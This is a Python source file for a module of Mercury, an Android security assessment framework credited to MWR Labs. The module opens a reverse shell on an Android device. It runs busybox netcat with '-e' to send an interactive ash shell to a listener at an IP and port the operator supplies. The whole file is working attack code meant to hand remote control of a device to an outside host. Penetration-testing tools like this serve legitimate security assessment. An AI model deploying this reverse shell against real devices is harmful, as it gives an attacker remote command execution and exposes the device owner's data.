from merc.lib.modules import Module

class ReverseShell(Module):
    """Description: Pipe an ash shell from this device to a netcat listener waiting at the specified IP and port
Credit: Tyrone Erasmus - MWR Labs
Usage: run exploit.shell.reverseshell -a ip=<ip> port=<port>"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "shell"]

    def execute(self, session, args):

        # Check if busybox exists
        if session.executeCommand("core", "fileSize", {'path':'/data/data/com.mwr.mercury/busybox'}).isError():
            print "\nRun setup.busybox first and then retry\n"
            return

        # Check if no argument came in
        if ("ip" not in args.keys()) and ("port" not in args.keys()):
            print "\nUsage: run exploit.shell.reverseshell -a ip=<ip> port=<port>\n"
            return

        try:

            request = {}
            request['args'] = "/data/data/com.mwr.mercury/busybox nc " + args["ip"] + " " + args["port"] + " -e /data/data/com.mwr.mercury/busybox ash -i"

            response = session.executeCommand("shell", "executeSingleCommand", request)

            if response.isError():
                print "\nAn error occurred: " + response.error + "\n"

        # FIXME: Choose specific exceptions to catch
        except Exception:
            pass
